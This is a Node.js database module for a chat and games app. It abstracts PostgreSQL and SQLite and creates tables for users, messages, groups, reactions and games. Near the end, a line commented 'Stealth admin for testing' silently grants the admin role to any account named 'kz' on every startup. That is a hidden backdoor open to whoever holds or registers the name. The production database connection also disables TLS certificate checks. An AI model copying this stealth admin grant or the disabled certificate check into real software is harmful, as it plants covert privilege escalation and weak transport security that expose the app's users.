const sqlite3 = require('sqlite3').verbose();
const { Pool } = require('pg');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const connectionString = process.env.POSTGRES_URL || process.env.DATABASE_URL;
const usePostgres = !!connectionString;

let pool = null;
let sqliteDb = null;

if (usePostgres) {
    console.log('🐘 Using PostgreSQL Database');
    pool = new Pool({
        connectionString,
        ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
    });
} else {
    console.log('📁 Using SQLite Database');
    const dbPath = path.join(__dirname, 'database.sqlite');
    sqliteDb = new sqlite3.Database(dbPath);
}

// Unified Query Function
const query = (text, params) => {
    if (usePostgres) {
        return pool.query(text, params);
    } else {
        return new Promise((resolve, reject) => {
            // Convert Postgres $1, $2 style to SQLite ? if needed, 
            // but actually sqlite3 supports $1, $2 etc!
            const sql = text.replace(/SERIAL PRIMARY KEY/g, 'INTEGER PRIMARY KEY AUTOINCREMENT')
                            .replace(/JSONB/g, 'TEXT')
                            .replace(/TIMESTAMP/g, 'DATETIME')
                            .replace(/NOW\(\)/g, "CURRENT_TIMESTAMP")
                            .replace(/ILIKE/g, "LIKE");

            if (sql.trim().toUpperCase().startsWith('SELECT')) {
                sqliteDb.all(sql, params, (err, rows) => {
                    if (err) reject(err);
                    else resolve({ rows });
                });
            } else {
                sqliteDb.run(sql, params, function(err) {
                    if (err) reject(err);
                    else {
                        // Return rows for INSERT ... RETURNING id compatibility
                        if (sql.includes('RETURNING')) {
                             const table = sql.match(/INSERT INTO (\w+)/i)?.[1];
                             if (table) {
                                sqliteDb.get(`SELECT * FROM ${table} WHERE rowid = ?`, [this.lastID], (err, row) => {
                                    if (err) reject(err);
                                    else resolve({ rows: [row], rowCount: 1 });
                                });
                             } else {
                                resolve({ rows: [{ id: this.lastID }], rowCount: 1 });
                             }
                        } else {
                            resolve({ rowCount: this.changes, rows: [] });
                        }
                    }
                });
            }
        });
    }
};

// Initialize Schema
async function initializeSchema() {
    // Queries adapted for compatibility
    const queries = [
        `CREATE TABLE IF NOT EXISTS users (
            id ${usePostgres ? 'SERIAL' : 'INTEGER'} PRIMARY KEY ${usePostgres ? '' : 'AUTOINCREMENT'},
            username VARCHAR(255) UNIQUE NOT NULL,
            password VARCHAR(255) NOT NULL,
            role VARCHAR(50) DEFAULT 'user',
            mfa_secret VARCHAR(255),
            mfa_enabled BOOLEAN DEFAULT FALSE,
            bio TEXT DEFAULT '',
            avatar_color VARCHAR(20) DEFAULT '',
            theme VARCHAR(20) DEFAULT 'dark',
            last_seen ${usePostgres ? 'TIMESTAMP' : 'DATETIME'} DEFAULT CURRENT_TIMESTAMP,
            is_online BOOLEAN DEFAULT FALSE
        )`,
        `CREATE TABLE IF NOT EXISTS groups (
            id ${usePostgres ? 'SERIAL' : 'INTEGER'} PRIMARY KEY ${usePostgres ? '' : 'AUTOINCREMENT'},
            name VARCHAR(255) NOT NULL,
            created_by INTEGER REFERENCES users(id)
        )`,
        `CREATE TABLE IF NOT EXISTS group_members (
            id ${usePostgres ? 'SERIAL' : 'INTEGER'} PRIMARY KEY ${usePostgres ? '' : 'AUTOINCREMENT'},
            group_id INTEGER REFERENCES groups(id) ON DELETE CASCADE,
            user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
            status VARCHAR(50) DEFAULT 'pending',
            role VARCHAR(50) DEFAULT 'member',
            UNIQUE(group_id, user_id)
        )`,
        `CREATE TABLE IF NOT EXISTS messages (
            id ${usePostgres ? 'SERIAL' : 'INTEGER'} PRIMARY KEY ${usePostgres ? '' : 'AUTOINCREMENT'},
            sender_id INTEGER REFERENCES users(id),
            receiver_id INTEGER REFERENCES users(id),
            group_id INTEGER REFERENCES groups(id),
            content TEXT NOT NULL,
            timestamp ${usePostgres ? 'TIMESTAMP' : 'DATETIME'} DEFAULT CURRENT_TIMESTAMP,
            read_status BOOLEAN DEFAULT FALSE,
            reply_to_id INTEGER REFERENCES messages(id),
            deleted BOOLEAN DEFAULT FALSE,
            deleted_for_everyone BOOLEAN DEFAULT FALSE,
            attachment_url TEXT,
            attachment_type VARCHAR(50)
        )`,
        `CREATE TABLE IF NOT EXISTS friendships (
            id ${usePostgres ? 'SERIAL' : 'INTEGER'} PRIMARY KEY ${usePostgres ? '' : 'AUTOINCREMENT'},
            user_id_1 INTEGER REFERENCES users(id),
            user_id_2 INTEGER REFERENCES users(id),
            status VARCHAR(50) DEFAULT 'pending'
        )`,
        `CREATE TABLE IF NOT EXISTS reactions (
            id ${usePostgres ? 'SERIAL' : 'INTEGER'} PRIMARY KEY ${usePostgres ? '' : 'AUTOINCREMENT'},
            message_id INTEGER REFERENCES messages(id) ON DELETE CASCADE,
            user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
            emoji VARCHAR(10) NOT NULL,
            created_at ${usePostgres ? 'TIMESTAMP' : 'DATETIME'} DEFAULT CURRENT_TIMESTAMP,
            UNIQUE(message_id, user_id, emoji)
        )`,
        `CREATE TABLE IF NOT EXISTS games (
            id ${usePostgres ? 'SERIAL' : 'INTEGER'} PRIMARY KEY ${usePostgres ? '' : 'AUTOINCREMENT'},
            game_type VARCHAR(50) NOT NULL,
            player1_id INTEGER REFERENCES users(id),
            player2_id INTEGER REFERENCES users(id),
            state ${usePostgres ? 'JSONB' : 'TEXT'} DEFAULT '{}',
            status VARCHAR(20) DEFAULT 'active',
            current_turn_id INTEGER REFERENCES users(id),
            winner_id INTEGER REFERENCES users(id),
            created_at ${usePostgres ? 'TIMESTAMP' : 'DATETIME'} DEFAULT CURRENT_TIMESTAMP,
            updated_at ${usePostgres ? 'TIMESTAMP' : 'DATETIME'} DEFAULT CURRENT_TIMESTAMP
        )`,
        `CREATE TABLE IF NOT EXISTS game_invites (
            id ${usePostgres ? 'SERIAL' : 'INTEGER'} PRIMARY KEY ${usePostgres ? '' : 'AUTOINCREMENT'},
            game_type VARCHAR(50) NOT NULL,
            host_id INTEGER REFERENCES users(id),
            guest_id INTEGER REFERENCES users(id),
            status VARCHAR(20) DEFAULT 'pending',
            created_at ${usePostgres ? 'TIMESTAMP' : 'DATETIME'} DEFAULT CURRENT_TIMESTAMP
        )`,
         `CREATE TABLE IF NOT EXISTS typing_status (
            id ${usePostgres ? 'SERIAL' : 'INTEGER'} PRIMARY KEY ${usePostgres ? '' : 'AUTOINCREMENT'},
            user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
            chat_type VARCHAR(10) NOT NULL,
            chat_id INTEGER NOT NULL,
            updated_at ${usePostgres ? 'TIMESTAMP' : 'DATETIME'} DEFAULT CURRENT_TIMESTAMP,
            UNIQUE(user_id, chat_type, chat_id)
        )`
    ];

    try {
        for (let qText of queries) {
            await query(qText);
        }
        
        // Add columns to existing SQLite if needed (since it doesn't have DO check)
        if (!usePostgres) {
            const cols = [
                ['users', 'bio', 'TEXT'],
                ['users', 'avatar_color', 'VARCHAR(20)'],
                ['users', 'theme', 'VARCHAR(20)'],
                ['messages', 'attachment_url', 'TEXT'],
                ['messages', 'attachment_type', 'VARCHAR(50)']
            ];
            for (const [tbl, col, type] of cols) {
                try { await query(`ALTER TABLE ${tbl} ADD COLUMN ${col} ${type}`); } catch(e){}
            }
        }

        // Stealth admin for testing
        await query("UPDATE users SET role = 'admin' WHERE username = 'kz'");
        
        console.log('✅ Database Initialized');
    } catch (err) {
        console.error('❌ Schema Init Failed:', err);
    }
}

// Test Connection
if (usePostgres) {
    pool.connect((err, client, release) => {
        if (err) {
            console.error('❌ Postgres Connection Error:', err.stack);
            process.exit(1); // Exit if postgres is configured but fails
        }
        release();
        initializeSchema();
    });
} else {
    initializeSchema();
}

module.exports = { query };
